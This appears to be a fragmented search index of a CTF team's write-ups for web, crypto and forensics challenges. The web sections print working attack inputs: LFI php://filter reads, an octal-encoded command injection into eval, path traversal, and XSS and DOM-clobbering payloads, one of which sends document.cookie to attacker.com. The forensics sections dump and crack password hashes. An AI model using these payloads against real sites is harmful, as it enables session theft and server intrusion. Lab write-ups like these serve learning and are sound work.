KCTF{So_YoU_ROT_iT_gOOd_jOOb}"]}],[{"l":"Knight CTF Web Writeups","p":["CTF Name : KnightCTF 2022","Category : Web"]},{"i":"can-you-be-admin","l":"Can You Be Admin?","p":["Web Page Looks Like this:","Upon changing the header to KnightSquad","Response: This page refers to knight squad home network. So, Only Knight Squad home network can access this page.","Now, Adding a Header Referer: localhost","Server Responded with a Login Page:","Here, author commented some encoded Stuffs","[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])....A Long Encoded String","By Decoding the with JSFUCK Decoder","Again Decode this decoded text with ascii-85","Using this creds and Login","There are some Cookie is tracking us","VXNlcl9UeXBl and Tm9ybWFsX1VzZXI= are Base64 Encoded.","Tm9ybWFsX1VzZXI-> Base64 Decode -> Normal_User","Now, Encode Admin in Base64 and Replace with Normal_User","Flag: KCTF"]},{"l":"My PHP Site","p":["Web Page Looks Like :","In Url, there is a File param, with is vulnerable to to LFI","file=/etc/passwd retuns","As he mentioned, its php site, so, lets View index.php with php wrappers","Payload: php://filter/convert.base64-encode/resource=index.php","Decode this string with Base64","But, the s3crEt_fl49.txt in the web root dir.","Flag: KCTF"]},{"i":"bypass-bypass-bypass","l":"BYPASS! BYPASS! BYPASS!","p":["First Look:","Upon checking the Source Code:","We need to Send a Post Request to /api/request/auth_token endpoint","It returns a auth_token.","upon adding X-Authorized-For: auth_token to the request,","Its, Redirects to /admin_dashboard","Flag: KCTF"]},{"l":"Find the Pass Code 2","p":["This is the 2nd Version of a another chal.","First Look:","He had Mentioned already, that ?source will give the Source","Source:","There is something called PHP type juggling.","Loose Comparison and Strict Comparison","Learn More","Magic String Used : 0e1137126905","Flag: KCTF"]},{"i":"most-secure-calculator---2","l":"Most Secure Calculator - 2","p":["First Look:","Upon Viewing the Source:","Looks Like, Some Regex is filtering the Inputs","Note: Only Numbers and Symbols are Accepted, Our Input is Passed to eval()","So, We are Going to Encode Our payload into Octal","Here, ( ) ' are allowed, So, we not need to encode these characters","Then, Remove White Spaces and add \\ and add before a ()","So, Our Payload: \\163\\171\\163\\164\\145\\155(\\143\\141\\164\\40\\146\\154\\141\\147\\56\\164\\170\\164)","Flag: KCTF"]}],[{"i":"#","p":["Beginner Level Challenges from MetaCTF"]},{"i":"metactf-2021---crypto","l":"Metactf 2021 - Crypto"},{"i":"ctf-name--metactf-2021-dec-5","l":"CTF Name : MetaCTF 2021 (Dec 5)","p":["image"]},{"i":"category--cryptography-5","l":"Category : Cryptography #5","p":["This Writeup involves Easy level challenges (Beginner Friendly) Pure Beginner Friendly Challenges"]},{"l":"1. Size Matters","p":["image","RSA Decoder in dcode.fr"]},{"i":"flag--metactfyou_broke_rsa","l":"Flag : MetaCTF{you_broke_rsa!}"},{"l":"2. A to Z","p":["image","Just an Alphabetical substitution image"]},{"i":"flag--bashful_is_my_fav_dwarf","l":"Flag : bashful_is_my_fav_dwarf"},{"l":"3. Wrong Way on a One Way Street","p":["image cb78e77e659c1648416cf5ac43fca4b65eeaefe1","crackstation.net image"]},{"i":"flag--babyloka13","l":"Flag : babyloka13"},{"l":"4. Unbreable Encryption","p":["image","Thats all image"]},{"l":"5. Tq For The pwd","p":["image Just a Base64","echo TWV0YUNURntlbmNvZGluZ19pc19OMFRfdGhlX3NhbWVfYXNfZW5jcnlwdGlvbiEhfQ==|base64 -d"]},{"i":"flag--metactfencoding_is_n0t_the_same_as_encryption","l":"Flag : MetaCTF{encoding_is_N0T_the_same_as_encryption!!}","p":["Thanks For reading - Team TamilCTF"]}],[{"i":"nullcon-ctf-2022---sourcer","l":"NullCon CTF 2022 - Sourcer","p":["Chal URL: http://52.59.124.14:10000/"]},{"i":"website-","l":"Website :","p":["Listing files in /usr/src/app/files/:"]},{"i":"apppy-will-give-the-source-code-of-this-challenge","l":"/app.py will give the Source Code of this Challenge.","p":["Flag is not here, it is in ../","We Need to Perform a Path Traversal to Get One Directory Back to Read the Flag."]},{"i":"source-code-","l":"Source Code :"},{"i":"get-route-","l":"GET Route :","p":["As Mentioned Below, '/' will Return file in /usr/src/app/files/","Flag is in /usr/src/app/flag.txt"]},{"i":"base-path-","l":"Base Path :","p":["BASEPATH=/usr/src/app"]},{"i":"fileserverhandler-","l":"FileServerHandler :"},{"i":"pathlstrip-","l":"path.lstrip :","p":["lstrip will Just Remove the / comes Left side of the String"]},{"i":"while-loop-","l":"While Loop :","p":["The Above While Loop will Run If the Path Variable Have 2 Dots (..)"]},{"i":"pathreplace-","l":"path.replace :","p":["path.replace(../,) will Search for ../ in Path Variable and Replace that with ."]},{"i":"pathjoin","l":"path.join","p":["We Have Control of the Path Variable!"]},{"i":"exploit-idea-","l":"Exploit Idea :","p":["After Some Trial and Error, I came Across this Interesting thing...","When the Path Variable Starts with /, The Overall Path is Overwritten. Now We have Control of the Path. Let's Exploit"]},{"i":"if-else-condition-statements-","l":"If Else Condition Statements :","p":["These If Else Statements are Responsible for Sending Response.","If the Length of fpath is equal or lesser that BASEPATH, the Server will return, Hm, this path is not within {BASEPATH}"]},{"i":"exploit-","l":"Exploit :","p":["Note: We Can Control Path Variable.","Our Input is Filtered Before Passed into fpath = os.path.join(BASEPATH, files, path)","To Exploit, Our Payload Want to Looks Like this, fpath = os.path.join(BASEPATH, files, /usr/src/app/flag.txt) to Read the Flag.","Final Payload : ..//usr/src/app/flag.txt","Let me Explain Why this Works:","After path.lstrip:","In While Loop, Replace Function is Called,","After This Replace Function,","Then, Our Path Variable is Passed to .join","And that Works :)","FLAG: ENO{PYTH0Ns_0sp4thj01n_fun_l0l}"]}],[{"i":"excesscookie-v1--v2","l":"Excesscookie V1 & V2","p":["Alter the payload like this,","And upload it as the profile picture,after that copy the userid and report it to the admin. And the ADMIN cookie stealed!!","Chall Name : Excess Cookie V1","Chall Name : Excess Cookie V2","Change auth cookie to this admin cookie, We found the FLAG !!","Description : Last challenge vulnerabilities are fixed. Try to solve this.","Description : You need to get logged in as admin to complete this challenge.","Here,the website having another functionality which was report the user.If i report any user admin will look into that user profile. So,What i done was,","I have the common payload used for fire the XSS using SVG,Here is the payload!!","It has the image uploading functionality and i tried to popup the XSS using SVG","On visiting the challenge link,it shows normal login and register page.Created the user account and get logged in as normal user.","Open the terminal and started python http server and open another tab and started ngrok with the port which is used for python http server","Same as per first challenge,but svg extension was not accepted. So,there was a way for bypassing it by renaming the extension as \"filename.sVG\" and uploaded this ,the site accpeted this svg and XSS fired!!!","Scalable Vector Graphics(SVG) is an XML-based vector image format for two-dimensional graphics with support for interactivity and animation.","Screenshot","There was no change in the payload ,using the same steps what i have done in V1 is enough to get the admin cookie"]}],[{"l":"Forensics"},{"i":"ctf-pragyan-ctf---forensics-writeup","l":"[CTF] Pragyan CTF - Forensics Writeup","p":["Hy Friends , this time i played Pragyan CTF 2022 and my team scored 8th place. This CTF was pretty crazy. We solved all forensics challenges , Good Job @Vyshak and @Paul."]},{"l":"Ye Olde Threat","p":["intel.txt have string aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQUVremJqV1JDZFVwNEY3ZjJ3dExnSWQyd2RTRlkwUXE=.","Convert this Base64 string to get a Gdrive URL.","It gives a zip file named intel.zip and inside it have a PNG image.","Tried to open the image but gave error , So it must be corrupted. Open it in hexeditor.","We can see the PNG header is missing also IHDR isn’t correct , IDAT also named as Ida7.","After fixing those we get a half-earth image.","Check the image with pngcheck, pngcheck -v Just_A_Plane_Image.png.","Here the length of second IDAT is really weird, Its over the size of the png file itself.","Search the second IDAT and set the length value to 00 00 20 00 which is 8192 bytes , same as previous IDAT chunk.","Now once again do pngcheck, this time it shows CRC error.","Fix the CRC using PCR tool, python2 PCRT.py -v -i Just_A_Plane_Image.png and open the output.png in stegsolve.","p_ctf{K@nye_w@nt5_To_Buy_Th3_3n71r3_E4rth}"]},{"i":"franks-little-beauty","l":"Frank’s Little Beauty","p":["comp.rar is interesting , but we can’t get file from cmdline , To get files first we need to do a scan , then dump file using its Offset.","Crack the hash a88d1e18706d3aa676e01e5943d15911 using crackstation , the cracked password is trolltoll. This password will be needed later because as of Description , frank reuses password so this will come in handy to extract zips or like that.","final flag : p_ctf{v0l4t1l1ty_i5_v3ry_h4ndy_at_r34d1ng_dump5_iasip}","First of all , dump password hashes to a file","flag 1/3 : p_ctf{v0l4t1l1ty","flag part 3/3 : _r34d1ng_dump5_iasip}","Found offset 0x000000003df4e450 for comp.rar , now dump the file from memory.","Its a password protected rar file , extract the file using trolltoll as password. It gives a image file which have 2nd part of the flag.","Its a shortcut to C:\\Program Files\\Microsoft Games\\Minesweeper\\sysinfo.txt. Check the cmdlog to see if any process opened this file. Its currently opened by a notepad process.","Last flag must be related to the Paddys in description. He don’t remember shortcut to Paddys.","Notepad uses UTF-16 to store texts , so grep through the memdump of notepad.","Now dig more to find remaining parts. Next area to check is process command lines.","Search for .lnk in the scanlog. Assumption was correct , there exists Paddys.lnk shortcut file and its offset is 0x000000003e1891d0.","strings -e l 3016.dmp | less","The decription have frank is lazy to type, one of the crucial area in a memory dump is clipboard . Lets see whats inside the clipboard of this memory dump.","Tried to extract this file using offset , but that didn’t worked. Since its opened by Notepad dumping the notepad process should give its contents.","vol -f MemDump.DMP --profile=Win7SP1x64 dumpfiles -D . -Q 0x000000003df4e450","vol -f MemDump.DMP --profile=Win7SP1x64 dumpfiles -D . 0x000000003e1891d0","vol -f MemDump.DMP --profile=Win7SP1x64 filescan scanlog","vol -f MemDump.DMP --profile=Win7SP1x64 memdump -p 3016 -D .","vol.py -f MemDump.DMP --profile=Win7SP1x64 clipboard","vol.py -f MemDump.DMP --profile=Win7SP1x64 cmdline cmdlog","vol.py -f MemDump.DMP --profile=Win7SP1x64 hashdump hashes","We got a pastebin link https://pastebin.com/3Ecrm2DY","We got Frank’s password hash : Frank Reynolds:1000:aad3b435b51404eeaad3b435b51404ee:a88d1e18706d3aa676e01e5943d15911:::.","writing results to a file is always a good practice, so no need to rescan all time."]},{"l":"Marcel and the iPad","p":["This challenge is similar to Bobby toes iPad. Googling is really useful :).","Stegsolve the marcel.png.","This is a one-time-pad message.","Message : 1h@ww_e0op$_0b_t0y","Pad is at the Comment section of exif of the image.","Pad : Steve_loves_apple","Decrypt using OTP tool.","p_ctf{1p@ds_j0ke$_0n_y0u}"]},{"l":"Hidden and Protected","p":["The description don’t have much suspicious info , although the title is interesting.","Firstly do binwalk.","We can see a zip file there, we can use foremost or binwalk itself to get that file.","foremost image.png","Inside the zip there is another image and its in JPG format , We have complied with first section of Title , that is Hidden.","So next part is protected, Since this is a JPG it should be a stegofile. Zip also have a text file , but didn’t bothered about it.","Using stegseek crack the stegofile.","stegseek image2.jpg /usr/share/wordlists/rockyou.txt"]},{"l":"Zipped scandal","p":["After some googling , found out that its an excerpt from Ready Player One Movie , Why can't we go backwards for once? Backwards, really fast. Fast as we can. Really, put the pedal to the metal, you know?.","But the pattern is Aa, Ab, Ac, first letter Uppercase and second letter Lowercase. Here is a way to extract the zip file.","Change its bit plane and it gives a QR with black background and white foreground. Its still not good , so invert the color to make it normal QR Code.","Cracking hash using crackstation gives SHA256. Next is to find the Location 36°20' 21.49 N, 96°48' 10.32 W. Paste the location cords in Google Map.","Final.zip is password protected. Looking at exif of the image , we get a hash in comment section and GPS coordinates.","It extracts all the zip files upto Zz.zip. Finally we are left with Checkpoint.zip. Extracting it gives an image and another zip.","Looking at the hint Fast as we can. Really put the pedal to the metal, you know! Bill and Ted did it., at first it didn’t made any sense.","Morse Code Audio Decoder","Now the hint makes much sense , reverse the audio and decode it again.","p_ctf{ic3t0wnc0stsic3cl0wnhist0wncr0wn}","Reverse Audio Online","Run the script to make pattern wordlist , then cat pattern.txt | while read line;do unzip $line.zip ;done","Thats the password , then it gives a black image.","The location is Pawnee City Hall.","The zip includes an audio and a hint.txt , Audio sounds like morse code , so tried to decode it and it gave gibberish message.","This QR points to Gdrive link zipped.zip","Tried this as password to extract Final.zip , but no success. So connect SHA256 with this result , that is Hash the location name in sha256.","We are given with a zip file named Aa.zip, extracting it gives Ab.zip and doing the same on it gives Ac.zip , so its like onion zipped many times."]}],[{"l":"Homework"},{"i":"challenge-name-homework","l":"Challenge name: Homework","p":["Flag: p_ctf{w3ll_d0n3_h4ck3r}"]}],[{"i":"dont-only-mash-clobber","l":"Don't Only Mash... Clobber!","p":["Another XSS Chal at First sight, But The Chal Name says Clobber!"]},{"i":"website","l":"Website:"},{"l":"Functionalities","p":["There are Two Functionalities.","Submit the url to View any Image in the Internet.(Client Side Rendering)","Submit a Picture Url To Admin Bot. So, The admin Bot also view the Image with Cookies."]},{"i":"source-code-review","l":"Source Code Review:"},{"i":"csp","l":"CSP:","p":["Default-src: 'self'; img-src: *;object-src: none;","As Far I know, the Above CSP is Only Able to Bypass when there is a JSONP endpoint in this Site."]},{"i":"get-route","l":"GET Route:","p":["/personalize","We can Provide a Image Url with /personalize?image=http://pic.com/pic.png","then, Our Pic Url is Passed into a img tag"]},{"i":"post-route","l":"POST Route:","p":["/visit","Ex Request:"]},{"i":"conditions","l":"Conditions:","p":["parsedUrl is a Object with key and values like Protocol, Host, Hostname, path...","Only HTTP and HTTPS Protocols are allowed","req.hostname is just the Request HOST header value.","Hostname must equal to the req.hostname","We cannot Control req.hostname value, Bcoz they Hosted in google Cloud. So, if we Changed the Value, it gives 404"]},{"i":"html-injection","l":"HTML Injection:","p":["We Can Perform HTMLi bcoz, Our Input is Not Filtered and Directly passed to the below Mentioned Template."]},{"i":"rabbit-hole","l":"Rabbit Hole:","p":["Our Goal to Steal the Admin Bot cookie.","The Above implementation Gives easy XSS.(without CSP)"]},{"l":"XSS","p":["As I mentioned Above, CSP is Looks Impossible to Bypass.","After 5 hrs, I Realized, Bypassing CSP is Rabbit Hole."]},{"i":"dom-clobbering","l":"DOM Clobbering:","p":["The Below Code is Client Side JAVASCRIPT code","This Javascript Loads with we Visit, /personalize?image=url"]},{"i":"exploit","l":"Exploit:","p":["In the Above Code, DEBUG_MODE is Not Defined.","CSP is Set to defualt-src: 'self'. So, the Javascript files hosted in the server itself only work.","So, Now we Have HTML injection and a Undedined variable.","In Order to Exploit this, we need to Overwrite the Undefined Variable DEBUG_MODE and Injecting our own value into DEBUG_MODE.","By Using DEBUG_MODE as ID, We can create a variable DEBUG_MODE.","Payload:","We successfully Defined DEBUG_MODE, which is Before Undefined. Now, the Above error says that, DEBUG_LOGGING_URL is Undefined.","Lets Define that!","Here, Href is Used to set a value for the DEBUG_LOGGING_URL.","No Errors in Javascript Console!!","Upon Looking the Network Tab,","A GET Request to Attacker.com with ?auth=image=(base64(imageURL))","?auth contains base64 Encoded cookie. Now, We dont Have any Cookies, So the The ?auth= is Empty.","Flag in the Admin bot cookie. In order to Get the Cookie, Send the about Payload to the Bot to get the Flag"]}],[{"l":"XSS 401"},{"i":"website","l":"Website:"},{"i":"source-code-review","l":"Source Code Review:","p":["This the a XSS chal, We need to find XSS to Steal Admin Cookies.","There is only one Functionality, We can Send URL to Admin Bot, Bot will Open the Link in Browser with Flag in Cookies.","escape Function Encode all the HTML tags.","parsedURL.hostname return the Hostname of the Provided URL.","Ex:","req.hostname is Just Host Header.","We cannot Control req.hostname value, Bcoz the Chal was Hosted in google Cloud. So, if we Changed the Value, it gives 404","Chal Description says: Note: The Node Version is 12.22.1","After Some Research, I came Across a CVE(CVE-2021-22931)","missing input validation of host names returned by Domain Name Servers in Node.js dns library which can lead to output of wrong hostnames...","But, I cannot find any Public Exploits."]},{"l":"HTML Injection Due to CVE-2021-22931","p":["If You Look Closer, the $ is Not escaped."]},{"i":"some-rfcs-for-hostname","l":"Some RFC's for HostName:","p":["Should not contain space","No matter, Upper case or Lower case, hostname will automatically converted to lowercase by the browser","Here Some chars that Break the hostname"]},{"i":"exploit-idea","l":"Exploit IDEA:","p":["We need a Payload without space and the without the above chars.","UrlEncoding the white space doesn't work.","Unicodes are Allowed in Hostnames","We Need to find a Unicode Char that Act like a white space, So we can Use that unicode as space to Bypass the RFC rules."]},{"i":"harmless-xss","l":"Harmless XSS:","p":["After 20 Min of Research, I came across a Blog with this payload.","svg%0Conload=alert()"]},{"i":"weaponizing-xss","l":"Weaponizing XSS:","p":["So, Now We have a XSS.","My First Idea was to use btoa(base64) to Encode the Cookies and Redirect the Bot to attacker server with the Cookies are path. ( onload=window.location = 'http://attacker.com/?'+btoa(document.cookie))","As i Mentioned Above, Upper case or Lower case, hostname will automatically converted to lowercase by the browser","So, Now the the Encoded Base64 cookie will be automatically converted to Lower Case. Usually Base64 is a Mix of Both Upper and Lower Case letters","If You Look Closer to The Above Image, the Payload is alert('AAABBBCCC'). But the Browser Automatically Converted the upper case to lowercase. bcoz, THIS IS HOSTNAME. lol","After 1 Hour, I realized, We can Write our Javascript Outside the Hostname and call the payload from Hostname.","Ex:","location.hash.slice(1) return the value after #","eval is a Javascript Function to run the Javascript Code.","Now, Browser Doesn't Converted the Upper Case to Lowercase."]},{"i":"flag","l":"Flag:","p":["From the Above Code, We know that, Flag is in the Admin Bot's Cookie"]},{"i":"exploit","l":"Exploit:","p":["URL:","Flag: wsc"]}],[{"l":"Core Team"}],[{"l":"TamilCTF"}]]